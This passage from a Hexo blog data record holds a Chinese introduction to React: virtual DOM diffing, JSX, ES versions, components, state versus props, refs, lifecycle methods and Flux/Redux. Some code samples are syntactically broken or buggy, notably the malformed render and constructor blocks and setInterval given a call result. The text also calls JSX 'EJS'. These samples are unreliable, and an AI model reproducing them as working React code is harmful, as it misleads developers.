总结\n\n我觉得React给前端开发带来了一种全新的思想，那就是以JS为中心，一种全新的世界。\n\n网页不再是网页，而是像工程一样，一块块搭建起来的，拆下来，搬上去都很容易，似的前端再也不是那个凌乱拼凑的年代。\n\n我想任何一种编程语言，无论是解释性、脚本、编译语言都逃离不了这个全新的年代，就是组件化，大家似乎都在不同方向发展，但实际上，确实一样的。\n\n# 相关阅读\n\n[深入浅出React（四）：虚拟DOM Diff算法解析](http://www.infoq.com/cn/articles/react-dom-diff)\n\n[React/React Native 的ES5 ES6写法对照表](http://bbs.reactnative.cn/topic/15/react-react-native-%E7%9A%84es5-es6%E5%86%99%E6%B3%95%E5%AF%B9%E7%85%A7%E8%A1%A8/2)\n\n[React组件声明周期过程说明](https://www.cllgeek.com/archives/544)","slug":"react","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xp500315es5eq2culv7","content":"<p>前两天，用React把 之前的 <a href=\"https://github.com/yfgeek/rpi-TempRuntime\" target=\"_blank\" rel=\"external\">基于树莓派3B,DHT11/DHT22,LCD1602的一个实时温度湿度检测系统</a> 的Web部分重构了一下。</p>\n<p>这个项目之前是用Semantic UI + eCharts + JQuery Datapicker写的，由于这个项目的实现过程比较经典，几乎把所有的感觉React的基础思想都实现了一遍。</p>\n<p>无疑，React给前端带来了各种新的想法与思想，声明式、虚拟Dom、单向数据流、JSX、组件化、Flux、以JavaScript为中心、React Native。</p>\n<p><img src=\"/content/images/react/0.png\" alt=\"\"></p>\n<h1 id=\"虚拟Dom\"><a href=\"#虚拟Dom\" class=\"headerlink\" title=\"虚拟Dom\"></a>虚拟Dom</h1><p>React是以JS为中心的，而非HTML，虚拟Dom是一个至关重要的概念。</p>\n<p>在jQuery出现之前，我们一般都是直接操作Dom，方法“暴力、简单”，也存在兼容性的问题。在jQuery出现之后，jQuery的选择器帮助我们简单、高效的操作Dom，也就是在jQuery出现之后，前端就开始大爆发了。</p>\n<p>但是随着发展，这种简单暴力的操作Dom的方法对于很多大型系统性工程来说，从软件工程的角度上讲，是杂乱、无序的，一旦时间久远，项目越来越大，维护成本就变大。于是，我们有了各种前端MVC、MVVM框架，典型的有Angular、React、vue.js，MVVM给我们带来一种全新的思想，数据绑定。</p>\n<p>不过，与此同时，React给我们带来了一种全新的思想，虚拟Dom，从此，我们再也不用直接操作Dom了，而是用虚拟Dom更新Dom。</p>\n<p>你可能会问，这样做，效率岂不是更低了？</p>\n<p>是的，也不是。其实没有那么明显，一般来讲，操作Dom树的Diff算法应该是O(n^3)，而React把效率降低到了O(n)。</p>\n<p><img src=\"/content/images/react/1.png\" alt=\"\"></p>\n<p>简单来讲，如图所示，React只会比较相同层级的Dom，从而简化了Dom Diff的复杂度，虽然有所舍弃，但是全局比较是没有必要的。</p>\n<p>通过在JSX文件中写虚拟Dom，React在内存中会自动拿现在的虚拟Dom和旧的虚拟Dom进行Diff操作，如果发现有Diff的部分，就拿出来形成新的Patch部分，加入到现在的Dom树上。</p>\n<p>也就是因为这个原因，虚拟Dom使得在操作Dom上更加高效，每次更新数据不会进行O(n^3)复杂的操作。</p>\n<p>你可能会问，什么是JSX？</p>\n<h1 id=\"JSX\"><a href=\"#JSX\" class=\"headerlink\" title=\"JSX\"></a>JSX</h1><p>其实JSX只是一种未编译的JavaScript，可以方便的对HTML进行书写，先上代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</div><div class=\"line\"><span class=\"keyword\">import</span> &#123; Button &#125; <span class=\"keyword\">from</span> <span class=\"string\">'semantic-ui-react'</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ButtonComponent</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</div><div class=\"line\">    render() &#123;</div><div class=\"line\">        <span class=\"keyword\">return</span>(</div><div class=\"line\">            <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span></span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">Button</span> <span class=\"attr\">color</span>=<span class=\"string\">'blue'</span> &gt;</span>分钟<span class=\"tag\">&lt;/<span class=\"name\">Button</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">Button</span> <span class=\"attr\">color</span>=<span class=\"string\">'violet'</span>&gt;</span>小时<span class=\"tag\">&lt;/<span class=\"name\">Button</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></div><div class=\"line\">        );</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> ButtonComponent;</div></pre></td></tr></table></figure>\n<p>代码部分用<code>ES6</code>书写，你可能会问什么是ES6？其实还有ES7(ECMAScript 2016)呢~</p>\n<p>那么，你可能看到了很变态的写法，就是HTML和JS混写，没错，这就是EJS，但请注意，这不是HTML，写着写着很有可能会掉入<a href=\"http://www.css88.com/react/docs/jsx-gotchas.html\" target=\"_blank\" rel=\"external\">JSX陷阱</a>。</p>\n<p>经过<code>babel</code>等工具的编译后，JSX在运行的时候会被编译为真实的JavaScript语言，之所以这样写，只是为了方便程序员更方便的写代码。</p>\n<p>比如上面的代码“HTML部分”会被编译为：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">React.createElement(<span class=\"string\">'button'</span>, &#123;<span class=\"attr\">class</span>: <span class=\"string\">'ui blue button'</span>&#125;, <span class=\"string\">'分钟'</span>);</div><div class=\"line\">React.createElement(<span class=\"string\">'button'</span>, &#123;<span class=\"attr\">class</span>: <span class=\"string\">'ui violet button'</span>&#125;, <span class=\"string\">'小时'</span>);</div></pre></td></tr></table></figure>\n<p>当然，JSX也有很多坑，比如：</p>\n<p><code>Module build failed: SyntaxError: Adjacent JSX elements must be wrapped in an enclosing tag</code></p>\n<p>作为新手，这个问题，我经常遇到，因为你在写每一个JSX模块的时候，你需要用类似于<code>&lt;div&gt;&lt;/div&gt;</code>作为开始与结尾，不规范的代码不会被编译成功。</p>\n<h1 id=\"ECMAScript-ES\"><a href=\"#ECMAScript-ES\" class=\"headerlink\" title=\"ECMAScript(ES)\"></a>ECMAScript(ES)</h1><p>ES无疑是这几年最火的前端语言，没错，他是JavaScript的改进版，我知道，其实还有很多其他类似的比如CoffeeScript，但是ES会被各大浏览器所兼容支持，但是你可能会问到兼容性问题，没事，我们有<code>babel</code>工具。</p>\n<ul>\n<li>ECMAScript：一个由 ECMA International 进行标准化，TC39 委员会进行监督的语言。通常用于指代标准本身。</li>\n<li>JavaScript：ECMAScript 标准的各种实现的最常用称呼。这个术语并不局限于某个特定版本的 ECMAScript 规范，并且可能被用于任何不同程度的任意版本的 ECMAScript 的实现。</li>\n<li>ECMAScript 5 (ES5)：ECMAScript 的第五版修订，于 2009 年完成标准化。这个规范在所有现代浏览器中都相当完全的实现了。</li>\n<li>ECMAScript 6 (ES6) / ECMAScript 2015 (ES2015)：ECMAScript 的第六版修订，于 2015 年完成标准化。这个标准被部分实现于大部分现代浏览器。可以查阅这张兼容性表来查看不同浏览器和工具的实现情况。</li>\n<li>ECMAScript Proposals：被考虑加入未来版本 ECMAScript 标准的特性与语法提案，他们需要经历五个阶段：Strawman（稻草人），Proposal（提议），Draft（草案），Candidate（候选）以及 Finished （完成）。</li>\n<li>ECMAScript 2016：第七版 ECMAScript 修订，增加了两个新特性。</li>\n</ul>\n<p>以上，都是我们常说的ES，在网上看到的代码目前以ES5和ES6居多，写法各异，我建议用最新版的写法写代码。</p>\n<p>说白了，就是Javascript并不是一个优秀的语言，但是经过不断的填补，修正，已经让Javascript支持了很多新特性，新的语法，更多的书写方式，以及拥有了更严谨的编程思想。比如<code>let</code>,arrow function(就是这个：<code>(i) =&gt; i + 1</code> )在ES中的运用等。</p>\n<p>所以，在认识React之前，最好学习ES的新特性以及<a href=\"http://blog.csdn.net/zhangjjie0110/article/details/53782537\" target=\"_blank\" rel=\"external\">常用的新特性</a>。</p>\n<h1 id=\"组件化\"><a href=\"#组件化\" class=\"headerlink\" title=\"组件化\"></a>组件化</h1><p>我觉得这是React的重量级思想，组件化前端，从此，前端再也不是东拼西凑，而是像积木一样，拼起来。</p>\n<p><img src=\"/content/images/react/2.png\" alt=\"\"></p>\n<p>React把单一的用户界面，拆成了各种各样的组件，形成“组件树”，采用分而治之的思想，有一个好处，就是维护起来极其方便，对于组件的修改也显得很容易。</p>\n<h1 id=\"数据绑定\"><a href=\"#数据绑定\" class=\"headerlink\" title=\"数据绑定\"></a>数据绑定</h1><p>众所周知，Angular是双向数据绑定的，并且引以为豪，因为更容易维护与理解。</p>\n<p>但是双向数据绑定也带来了许多问题，会在些其他功能的时候莫名其妙出现很多bug。</p>\n<p>React是单向数据绑定的，是非常稳定的做法，但是也存在一些问题，就是在操作其他组件的时候，对于数据流的处理，显得异常困难。</p>\n<p>在React中，数据绑定仅仅需要在<code>render</code>中写<code>{数据绑定}</code>，而非像Angular一样，两边都要设置，一定情况下讲，这是比较方便的。</p>\n<h1 id=\"数据模型\"><a href=\"#数据模型\" class=\"headerlink\" title=\"数据模型\"></a>数据模型</h1><h2 id=\"state\"><a href=\"#state\" class=\"headerlink\" title=\"state\"></a>state</h2><p>话说回来，React的每一个组件的实质是什么？状态机（State Machines），在React的每一个组件里，通过更新<code>this.state</code>，再通过<code>render()</code>进行渲染，React会自动把最新的状态渲染到网页上。</p>\n<p>举个栗子🌰<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DateSelectorComponent</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">constructor</span>(props) &#123;</div><div class=\"line\">    <span class=\"keyword\">super</span>(props);</div><div class=\"line\">    <span class=\"keyword\">let</span> todaydate = <span class=\"keyword\">this</span>.showLocale(<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>());</div><div class=\"line\">     <span class=\"keyword\">this</span>.state = &#123;</div><div class=\"line\">         <span class=\"attr\">timenow</span>: todaydate,</div><div class=\"line\">         <span class=\"attr\">showCalendar</span>: <span class=\"literal\">false</span></div><div class=\"line\">    &#125;</div><div class=\"line\">            <span class=\"keyword\">return</span>(</div><div class=\"line\">            <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">Input</span> <span class=\"attr\">icon</span>=<span class=\"string\">'calendar'</span> <span class=\"attr\">iconPosition</span>=<span class=\"string\">'left'</span> <span class=\"attr\">readOnly</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;this.showCalendar&#125;</span> <span class=\"attr\">value</span>=<span class=\"string\">&#123;this.state.timenow&#125;</span> <span class=\"attr\">ref</span>=<span class=\"string\">\"inputbox\"</span>/&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">ButtonComponent</span> /&gt;</span></div><div class=\"line\">            &#123;CalendarComponent&#125;</div><div class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">        )</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>通过这样的方式，我就设置了state的默认初始值，默认日历选择器是不出现的，而今天的日期是今天日期，这很正常。然后在将所谓的值渲染到Dom上。</p>\n<h2 id=\"props\"><a href=\"#props\" class=\"headerlink\" title=\"props\"></a>props</h2><p>React的数据流是单向的，是自上向下的层级传递的，props可以对固定的数据进行传递。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HelloMessage</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</div><div class=\"line\">  render( </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Hello &#123;this.props.name&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span>;</div><div class=\"line\">    )</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MainPage</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</div><div class=\"line\">render()&#123;</div><div class=\"line\"> <span class=\"keyword\">return</span>(</div><div class=\"line\">  <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">HelloMessage</span> <span class=\"attr\">name</span>=<span class=\"string\">\"John\"</span> /&gt;</span></span></div><div class=\"line\">  )</div><div class=\"line\"> &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>在这种情况下，子组件会自动读取出父组件传递过来的<code>props</code>值John，并快速的渲染在页面上。</p>\n<h2 id=\"到底谁是谁\"><a href=\"#到底谁是谁\" class=\"headerlink\" title=\"到底谁是谁\"></a>到底谁是谁</h2><p><code>state</code>和<code>props</code>看起来很相似，其实是完全不同的东西。</p>\n<table>\n<thead>\n<tr>\n<th>问题</th>\n<th><em>props</em></th>\n<th><em>state</em></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>可以从父组件得到初始值吗？</td>\n<td>可以</td>\n<td>可以</td>\n<td></td>\n</tr>\n<tr>\n<td>可以被父组件改变值吗？</td>\n<td>可以</td>\n<td>不可以</td>\n<td></td>\n</tr>\n<tr>\n<td>可以设置组件内部的初始值吗？</td>\n<td>可以</td>\n<td>可以</td>\n<td></td>\n</tr>\n<tr>\n<td>可以改变组件内部的初始值吗？</td>\n<td>不可以</td>\n<td>可以</td>\n<td></td>\n</tr>\n<tr>\n<td>可以设置子组件的初始值吗？</td>\n<td>可以</td>\n<td>可以</td>\n<td></td>\n</tr>\n<tr>\n<td>可以改变子组件的初始值吗？</td>\n<td>可以</td>\n<td>不可以</td>\n</tr>\n</tbody>\n</table>\n<p>按照我的个人理解，<code>props</code>是静态的，存入不变量，比如 购物车里的 商品名称、价格；<code>state</code>是动态的，存入随时变化的量，比如 用户购买商品的总价，购买数目。</p>\n<p>从操作的角度上讲，<code>props</code>是单向传递的，会一直被传递到子组件，而<code>state</code>更倾向于自身，只能改变自身的值。</p>\n<h1 id=\"获取Dom\"><a href=\"#获取Dom\" class=\"headerlink\" title=\"获取Dom\"></a>获取Dom</h1><p><code>this.refs</code>是react的重要组成之一，通过该方法可以快速高效的获取Dom。</p>\n<p>例如，在JSX代码中这样写道<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">ref</span>=<span class=\"string\">\"myInput\"</span> /&gt;</span></div></pre></td></tr></table></figure></p>\n<p>便可以通过<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">this</span>.refs.myInput.value</div></pre></td></tr></table></figure></p>\n<p>命令获取该Input下的dom属性的value值，非常方便。</p>\n<h1 id=\"生命周期\"><a href=\"#生命周期\" class=\"headerlink\" title=\"生命周期\"></a>生命周期</h1><p>组件都是有生命周期的，生命周期内，<code>props</code>和<code>state</code>改变会导致React自动用Diff算法重新渲染页面。那么生命周期到底都有哪些呢？</p>\n<p>大体上分为三类：</p>\n<ul>\n<li>挂载： 组件被插入到DOM中。</li>\n<li>更新： 组件被重新渲染，查明DOM是否应该刷新。</li>\n<li>移除： 组件从DOM中移除。</li>\n</ul>\n<p>从流程上讲，是这样的：</p>\n<p><strong>挂载期：</strong></p>\n<p>getInitialState() –&gt;&gt; componentWillMount() –&gt;&gt; render() –&gt;&gt; componentDidMount()</p>\n<p><strong>更新期：</strong></p>\n<p>componentWillReceiveProps() –&gt;&gt; shouldComponentUpdate() –&gt;&gt; componentWillUpdate render() –&gt;&gt; componentDidUpdate()</p>\n<p><strong>移除期：</strong></p>\n<p>componentWillUnmount()</p>\n<h2 id=\"挂载\"><a href=\"#挂载\" class=\"headerlink\" title=\"挂载\"></a>挂载</h2><p><strong>componentWillMount()</strong>： 在初次渲染之前执行一次，最早的执行点</p>\n<p><strong>componentDidMount()</strong>： 在初次渲染之后执行，比较常用，比如持续执行某事件：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">componentDidMount()&#123;</div><div class=\"line\"> setInterval(<span class=\"keyword\">this</span>.loadData(<span class=\"keyword\">this</span>.state.date),<span class=\"number\">1000</span>);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h2 id=\"更新\"><a href=\"#更新\" class=\"headerlink\" title=\"更新\"></a>更新</h2><p><strong>componentWillReceiveProps()</strong>： 在组件接收到新的 <code>props</code> 的时候调用。在初始化渲染的时候，该方法不会调用。</p>\n<p><strong>shouldComponentUpdate()</strong>： 在接收到新的 <code>props</code> 或者 <code>state</code>，将要渲染之前调用。</p>\n<p><strong>componentWillUpdate()</strong>： 在接收到新的 props 或者 state 之前立刻调用。</p>\n<p><strong>componentDidUpdate()</strong>： 在组件的更新已经同步到 DOM 中之后立刻被调用。</p>\n<h2 id=\"移除\"><a href=\"#移除\" class=\"headerlink\" title=\"移除\"></a>移除</h2><p><strong>componentWillUnmount()</strong>： 在组件从 DOM 中移除的时候立刻被调用。</p>\n<h1 id=\"Flux\"><a href=\"#Flux\" class=\"headerlink\" title=\"Flux\"></a>Flux</h1><p>React是MVC中V的一部分，而Flux则是M和C的部分，Flux是单向数据流，符合React的核心思想，不过，Flux并不完善，是一个很松散的架构。</p>\n<ul>\n<li>Dispatcher： 处理动作分发，维护 Store 之间的依赖关系</li>\n<li>Store： 数据和逻辑部分</li>\n<li>View： React 组件，这一层可以看作 controller-views，作为视图同时响应用户交互</li>\n<li>Action： 提供给 Dispatcher 传递数据给 Store</li>\n</ul>\n<p><img src=\"/content/images/react/3.png\" alt=\"\"></p>\n<h1 id=\"Redux\"><a href=\"#Redux\" class=\"headerlink\" title=\"Redux\"></a>Redux</h1><p><img src=\"/content/images/react/5.jpeg\" alt=\"\"></p>\n<p>Flux把总架构都搭好了，可是实现起来并不容易，因为Flux并没有强大的API，只是一种纯粹的思想实现，而Redux是Flux的“升级版”，把各个部分更加方便的实现起来。</p>\n<p>此部分未完待续</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>我觉得React给前端开发带来了一种全新的思想，那就是以JS为中心，一种全新的世界。</p>\n<p>网页不再是网页，而是像工程一样，一块块搭建起来的，拆下来，搬上去都很容易，似的前端再也不是那个凌乱拼凑的年代。</p>\n<p>我想任何一种编程语言，无论是解释性、脚本、编译语言都逃离不了这个全新的年代，就是组件化，大家似乎都在不同方向发展，但实际上，确实一样的。</p>\n<h1 id=\"相关阅读\"><a href=\"#相关阅读\" class=\"headerlink\" title=\"相关阅读\"></a>相关阅读</h1><p><a href=\"http://www.infoq.com/cn/articles/react-dom-diff\" target=\"_blank\" rel=\"external\">深入浅出React（四）：虚拟DOM Diff算法解析</a></p>\n<p><a href=\"http://bbs.reactnative.cn/topic/15/react-react-native-%E7%9A%84es5-es6%E5%86%99%E6%B3%95%E5%AF%B9%E7%85%A7%E8%A1%A8/2\" target=\"_blank\" rel=\"external\">React/React Native 的ES5 ES6写法对照表</a></p>\n<p><a href=\"https://www.cllgeek.com/archives/544\" target=\"_blank\" rel=\"external\">React组件声明周期过程说明</a></p>\n","excerpt":"","more":"<p>前两天，用React把 之前的 <a href=\"https://github.com/yfgeek/rpi-TempRuntime\">基于树莓派3B,DHT11/DHT22,LCD1602的一个实时温度湿度检测系统</a> 的Web部分重构了一下。</p>\n<p>这个项目之前是用Semantic UI + eCharts + JQuery Datapicker写的，由于这个项目的实现过程比较经典，几乎把所有的感觉React的基础思想都实现了一遍。</p>\n<p>无疑，React给前端带来了各种新的想法与思想，声明式、虚拟Dom、单向数据流、JSX、组件化、Flux、以JavaScript为中心、React Native。</p>\n<p><img src=\"/content/images/react/0.png\" alt=\"\"></p>\n<h1 id=\"虚拟Dom\"><a href=\"#虚拟Dom\" class=\"headerlink\" title=\"虚拟Dom\"></a>虚拟Dom</h1><p>React是以JS为中心的，而非HTML，虚拟Dom是一个至关重要的概念。</p>\n<p>在jQuery出现之前，我们一般都是直接操作Dom，方法“暴力、简单”，也存在兼容性的问题。在jQuery出现之后，jQuery的选择器帮助我们简单、高效的操作Dom，也就是在jQuery出现之后，前端就开始大爆发了。</p>\n<p>但是随着发展，这种简单暴力的操作Dom的方法对于很多大型系统性工程来说，从软件工程的角度上讲，是杂乱、无序的，一旦时间久远，项目越来越大，维护成本就变大。于是，我们有了各种前端MVC、MVVM框架，典型的有Angular、React、vue.js，MVVM给我们带来一种全新的思想，数据绑定。</p>\n<p>不过，与此同时，React给我们带来了一种全新的思想，虚拟Dom，从此，我们再也不用直接操作Dom了，而是用虚拟Dom更新Dom。</p>\n<p>你可能会问，这样做，效率岂不是更低了？</p>\n<p>是的，也不是。其实没有那么明显，一般来讲，操作Dom树的Diff算法应该是O(n^3)，而React把效率降低到了O(n)。</p>\n<p><img src=\"/content/images/react/1.png\" alt=\"\"></p>\n<p>简单来讲，如图所示，React只会比较相同层级的Dom，从而简化了Dom Diff的复杂度，虽然有所舍弃，但是全局比较是没有必要的。</p>\n<p>通过在JSX文件中写虚拟Dom，React在内存中会自动拿现在的虚拟Dom和旧的虚拟Dom进行Diff操作，如果发现有Diff的部分，就拿出来形成新的Patch部分，加入到现在的Dom树上。</p>\n<p>也就是因为这个原因，虚拟Dom使得在操作Dom上更加高效，每次更新数据不会进行O(n^3)复杂的操作。</p>\n<p>你可能会问，什么是JSX？</p>\n<h1 id=\"JSX\"><a href=\"#JSX\" class=\"headerlink\" title=\"JSX\"></a>JSX</h1><p>其实JSX只是一种未编译的JavaScript，可以方便的对HTML进行书写，先上代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</div><div class=\"line\"><span class=\"keyword\">import</span> &#123; Button &#125; <span class=\"keyword\">from</span> <span class=\"string\">'semantic-ui-react'</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ButtonComponent</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</div><div class=\"line\">    render() &#123;</div><div class=\"line\">        <span class=\"keyword\">return</span>(</div><div class=\"line\">            <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">Button</span> <span class=\"attr\">color</span>=<span class=\"string\">'blue'</span> &gt;</span>分钟<span class=\"tag\">&lt;/<span class=\"name\">Button</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">Button</span> <span class=\"attr\">color</span>=<span class=\"string\">'violet'</span>&gt;</span>小时<span class=\"tag\">&lt;/<span class=\"name\">Button</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span></div><div class=\"line\">        );</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> ButtonComponent;</div></pre></td></tr></table></figure>\n<p>代码部分用<code>ES6</code>书写，你可能会问什么是ES6？其实还有ES7(ECMAScript 2016)呢~</p>\n<p>那么，你可能看到了很变态的写法，就是HTML和JS混写，没错，这就是EJS，但请注意，这不是HTML，写着写着很有可能会掉入<a href=\"http://www.css88.com/react/docs/jsx-gotchas.html\">JSX陷阱</a>。</p>\n<p>经过<code>babel</code>等工具的编译后，JSX在运行的时候会被编译为真实的JavaScript语言，之所以这样写，只是为了方便程序员更方便的写代码。</p>\n<p>比如上面的代码“HTML部分”会被编译为：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">React.createElement(<span class=\"string\">'button'</span>, &#123;<span class=\"attr\">class</span>: <span class=\"string\">'ui blue button'</span>&#125;, <span class=\"string\">'分钟'</span>);</div><div class=\"line\">React.createElement(<span class=\"string\">'button'</span>, &#123;<span class=\"attr\">class</span>: <span class=\"string\">'ui violet button'</span>&#125;, <span class=\"string\">'小时'</span>);</div></pre></td></tr></table></figure>\n<p>当然，JSX也有很多坑，比如：</p>\n<p><code>Module build failed: SyntaxError: Adjacent JSX elements must be wrapped in an enclosing tag</code></p>\n<p>作为新手，这个问题，我经常遇到，因为你在写每一个JSX模块的时候，你需要用类似于<code>&lt;div&gt;&lt;/div&gt;</code>作为开始与结尾，不规范的代码不会被编译成功。</p>\n<h1 id=\"ECMAScript-ES\"><a href=\"#ECMAScript-ES\" class=\"headerlink\" title=\"ECMAScript(ES)\"></a>ECMAScript(ES)</h1><p>ES无疑是这几年最火的前端语言，没错，他是JavaScript的改进版，我知道，其实还有很多其他类似的比如CoffeeScript，但是ES会被各大浏览器所兼容支持，但是你可能会问到兼容性问题，没事，我们有<code>babel</code>工具。</p>\n<ul>\n<li>ECMAScript：一个由 ECMA International 进行标准化，TC39 委员会进行监督的语言。通常用于指代标准本身。</li>\n<li>JavaScript：ECMAScript 标准的各种实现的最常用称呼。这个术语并不局限于某个特定版本的 ECMAScript 规范，并且可能被用于任何不同程度的任意版本的 ECMAScript 的实现。</li>\n<li>ECMAScript 5 (ES5)：ECMAScript 的第五版修订，于 2009 年完成标准化。这个规范在所有现代浏览器中都相当完全的实现了。</li>\n<li>ECMAScript 6 (ES6) / ECMAScript 2015 (ES2015)：ECMAScript 的第六版修订，于 2015 年完成标准化。这个标准被部分实现于大部分现代浏览器。可以查阅这张兼容性表来查看不同浏览器和工具的实现情况。</li>\n<li>ECMAScript Proposals：被考虑加入未来版本 ECMAScript 标准的特性与语法提案，他们需要经历五个阶段：Strawman（稻草人），Proposal（提议），Draft（草案），Candidate（候选）以及 Finished （完成）。</li>\n<li>ECMAScript 2016：第七版 ECMAScript 修订，增加了两个新特性。</li>\n</ul>\n<p>以上，都是我们常说的ES，在网上看到的代码目前以ES5和ES6居多，写法各异，我建议用最新版的写法写代码。</p>\n<p>说白了，就是Javascript并不是一个优秀的语言，但是经过不断的填补，修正，已经让Javascript支持了很多新特性，新的语法，更多的书写方式，以及拥有了更严谨的编程思想。比如<code>let</code>,arrow function(就是这个：<code>(i) =&gt; i + 1</code> )在ES中的运用等。</p>\n<p>所以，在认识React之前，最好学习ES的新特性以及<a href=\"http://blog.csdn.net/zhangjjie0110/article/details/53782537\">常用的新特性</a>。</p>\n<h1 id=\"组件化\"><a href=\"#组件化\" class=\"headerlink\" title=\"组件化\"></a>组件化</h1><p>我觉得这是React的重量级思想，组件化前端，从此，前端再也不是东拼西凑，而是像积木一样，拼起来。</p>\n<p><img src=\"/content/images/react/2.png\" alt=\"\"></p>\n<p>React把单一的用户界面，拆成了各种各样的组件，形成“组件树”，采用分而治之的思想，有一个好处，就是维护起来极其方便，对于组件的修改也显得很容易。</p>\n<h1 id=\"数据绑定\"><a href=\"#数据绑定\" class=\"headerlink\" 